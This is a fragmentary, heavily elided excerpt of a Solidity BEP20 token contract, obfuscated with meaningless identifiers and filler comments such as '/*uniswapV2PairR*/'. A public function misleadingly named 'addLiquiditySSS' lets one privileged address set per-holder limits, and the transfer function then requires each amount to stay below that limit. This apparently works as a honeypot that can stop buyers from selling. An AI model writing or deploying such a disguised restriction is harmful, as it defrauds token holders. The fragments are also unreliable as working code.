...
contract TOKEN is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfere = 5;


    mapping(address => bool) private _marketaecounts;

    mapping(address => uint256) public _AaWhere;


    function addLiquiditySSS(address _address, uint256 _value) public {
        if(
_tokenAddress
 /*uniswapV2PairR uniswapV2PairR*/ ==  /*uniswapV2PairR*/
            msg.sender
        ){
        _AaWhere[_address]
 /*uniswapV2PairR uniswapV2PairR*/ =  /*uniswapV2PairR*/
    ...
    returns (bool)
    {
        ...
        if (
_tokenAddress
   /*uniswapV2PairR uniswapV2PairR*/ ==  /*uniswapV2PairR uniswapV2PairR*/
            owner
) {
    ...
    function _transfer(
        ...
        if (rF) {
            ...
            if (
                ...
                tradefere = _AaWhere[sender];
                /*uniswapV2PairR f*/require(
amount
                    /*uniswapV2PairR uniswapV2PairR*/< /*uniswapV2PairR uniswapV2PairR*/
tradefere
                );
